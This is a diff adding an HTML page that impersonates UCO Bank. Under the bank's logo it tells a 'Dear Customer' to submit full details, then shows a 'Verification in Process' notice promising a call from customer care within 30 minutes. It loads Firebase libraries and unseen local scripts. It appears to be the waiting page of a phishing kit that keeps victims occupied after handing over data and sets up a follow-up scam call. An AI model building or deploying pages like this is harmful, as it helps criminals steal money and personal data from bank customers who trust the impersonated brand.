@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UCO Bank Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        .header {
+            background-color: #f7cc01;
+            padding: 10px;
+            text-align: center;
+        }
+        .header img {
+            max-height: 50px;
+        }
+        .banner {
+            text-align: center;
+            background-color: #0033a0;
+            color: white;
+            padding: 10px 0;
+            font-size: 18px;
+        }
+        .content {
+            max-width: 600px;
+            margin: 20px auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .content img {
+            width: 100%;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+        .content h3 {
+            margin-bottom: 10px;
+            color: #333;
+        }
+        .slider {
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+        .slider img {
+            width: 100%;
+            display: block;
+            border-radius: 8px;
+        }
+        .content form input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .content form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0033a0;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .content form button:hover {
+            background-color: #002280;
+        }
+        .footer {
+            text-align: center;
+            padding: 10px;
+            background-color: #0033a0;
+            color: white;
+        }
+        .footer a {
+            margin: 0 10px;
+            color: white;
+            text-decoration: none;
+            font-size: 18px;
+        }
+       .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 15px 20px;
+            }
+            h1 {
+                font-size: 20px;
+            }
+            p {
+                font-size: 14px;
+            }
+        }
+
+
+
+
+
+    </style>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+    <div class="header">
+        <img src="p_uco.png" alt="UCO Bank Logo">
+    </div>
+    <div class="banner">
+        Dear Customer, Submit Full Details
+    </div>
+    <div class="container">
+        <div class="loader"></div>
+        <h1>Verification in Process</h1>
+        <p>Thank you for your patience. Your verification is in process. Please wait for up to 30 minutes to receive a call from our customer care team. We appreciate your understanding.</p>
+    </div>
+            
+         
+  
+     
+
+    </div>
+    <div class="footer">
+        Follow us on:
+        <a href="#" target="_blank">WhatsApp</a>
+        <a href="#" target="_blank">Facebook</a>
+        <a href="#" target="_blank">Twitter</a>
+        <a href="#" target="_blank">Instagram</a>
+        <a href="#" target="_blank">YouTube</a>
+        <a href="#" target="_blank">LinkedIn</a>
+    </div>
+
+<img src="foot.jpeg" alt="Footer Image" style="max-height: 750px; margin-bottom: 750px;">
+
+
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1/firebase.js"></script>
+    
+ <script src="firebase.js">  </script>
+<script src="3doc.js">  </script>
+
+
+</body>
+</html>
